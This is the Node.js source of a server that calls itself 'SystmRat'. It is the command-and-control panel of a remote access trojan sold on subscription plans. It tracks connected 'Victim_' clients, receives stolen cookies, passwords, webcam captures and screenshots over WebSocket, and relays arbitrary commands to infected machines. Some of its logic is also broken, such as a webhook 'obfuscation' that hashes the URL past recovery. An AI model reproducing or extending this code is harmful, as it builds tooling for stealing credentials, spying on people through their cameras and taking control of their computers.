const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const crypto = require('crypto');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const axios = require('axios');

app.use(express.json());
app.use(express.static('public'));

let users = {
    'admin': { password: crypto.createHash('sha256').update('adminpass').digest('hex'), isAdmin: true, planExpires: null, suspended: false }
};
let clients = {};
let userClients = {};

function obfuscateWebhook(webhook) {
    return crypto.createHash('sha256').update(webhook).digest('hex');
}

function sendToDiscord(webhook, message) {
    const obfuscated = users['admin'].discordWebhook || '';
    if (obfuscated) {
        const original = Object.keys(users).find(key => users[key].discordWebhook === obfuscated) || '';
        axios.post(original, { content: message }).catch(() => {});
    }
}

wss.on('connection', (ws, req) => {
    const userId = req.headers['x-user-id'] || 'default';
    if (!users[userId] || users[userId].suspended) {
        ws.close();
        return;
    }
    if (!clients[userId]) clients[userId] = [];
    const clientId = crypto.randomBytes(16).toString('hex');
    const username = `Victim_${clientId.slice(0, 8)}`;
    const clientData = {
        id: clientId,
        username: username,
        infected: Math.floor(Math.random() * 1000),
        cookies: Math.floor(Math.random() * 5000),
        passwords: [],
        status: 'Broken',
        isAdmin: false,
        ws: ws
    };
    clients[userId].push(clientData);
    if (!userClients[userId]) userClients[userId] = [];
    userClients[userId].push(clientData);

    ws.on('message', (message) => {
        const data = JSON.parse(message);
        const client = clients[userId].find(c => c.id === data.id);
        if (client) {
            if (data.cookies) client.cookies += data.cookies;
            if (data.passwords) client.passwords = client.passwords.concat(data.passwords);
            if (data.webcam) client.webcam = data.webcam;
            if (data.screenshot) client.screenshot = data.screenshot;
            if (data.adminCheck) client.isAdmin = data.adminCheck;
            if (data.status) client.status = data.status;
        }
    });

    ws.on('close', () => {
        clients[userId] = clients[userId].filter(c => c.id !== clientId);
        userClients[userId] = userClients[userId].filter(c => c.id !== clientId);
        if (clients[userId].length === 0) delete clients[userId];
    });

    ws.send(JSON.stringify({ id: clientId, userId: userId }));
});

app.get('/clients/:userId', (req, res) => {
    const userId = req.params.userId;
    if (users[userId] && !users[userId].suspended) {
        res.json(userClients[userId] || []);
    } else {
        res.status(403).send('Access denied');
    }
});

app.post('/command/:userId', (req, res) => {
    const { userId } = req.params;
    const { id, command, args } = req.body;
    if (users[userId] && !users[userId].suspended) {
        const client = clients[userId].find(c => c.id === id);
        if (client && client.ws.readyState === 1) {
            client.ws.send(JSON.stringify({ command, args }));
            res.send({ status: 'Command sent' });
        } else {
            res.send({ status: 'Client not found' });
        }
    } else {
        res.status(403).send('Access denied');
    }
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const hash = crypto.createHash('sha256').update(password).digest('hex');
    if (users[username] && users[username].password === hash) {
        res.json({ userId: username, success: true });
    } else {
        res.status(401).send('Invalid credentials');
    }
});

app.post('/register', (req, res) => {
    const { username, password, isAdmin } = req.body;
    if (!users[username]) {
        users[username] = {
            password: crypto.createHash('sha256').update(password).digest('hex'),
            isAdmin: isAdmin || false,
            planExpires: null,
            suspended: false,
            discordWebhook: ''
        };
        res.json({ success: true });
    } else {
        res.status(400).send('User exists');
    }
});

app.post('/admin/action', (req, res) => {
    const { action, targetUser, days, planExpires } = req.body;
    if (users[req.headers['x-user-id']] && users[req.headers['x-user-id']].isAdmin) {
        if (action === 'ban' && users[targetUser]) {
            users[targetUser].suspended = true;
        } else if (action === 'unban' && users[targetUser]) {
            users[targetUser].suspended = false;
        } else if (action === 'suspend' && users[targetUser]) {
            users[targetUser].suspended = true;
            setTimeout(() => { users[targetUser].suspended = false; }, days * 86400000);
        } else if (action === 'setPlan' && users[targetUser]) {
            users[targetUser].planExpires = new Date(planExpires).getTime();
            setInterval(() => {
                if (new Date().getTime() > users[targetUser].planExpires) {
                    users[targetUser].suspended = true;
                }
            }, 60000);
        }
        res.json({ success: true });
    } else {
        res.status(403).send('Admin access required');
    }
});

app.post('/settings', (req, res) => {
    const { userId, discordWebhook } = req.body;
    if (users[userId] && !users[userId].suspended) {
        users[userId].discordWebhook = obfuscateWebhook(discordWebhook);
        res.json({ success: true });
    } else {
        res.status(403).send('Access denied');
    }
});

app.post('/change-password', (req, res) => {
    const { userId, oldPassword, newPassword } = req.body;
    const oldHash = crypto.createHash('sha256').update(oldPassword).digest('hex');
    if (users[userId] && users[userId].password === oldHash) {
        users[userId].password = crypto.createHash('sha256').update(newPassword).digest('hex');
        res.json({ success: true });
    } else {
        res.status(401).send('Invalid password');
    }
});

server.listen(3000, () => {
    console.log('SystmRat server running on port 3000');
});
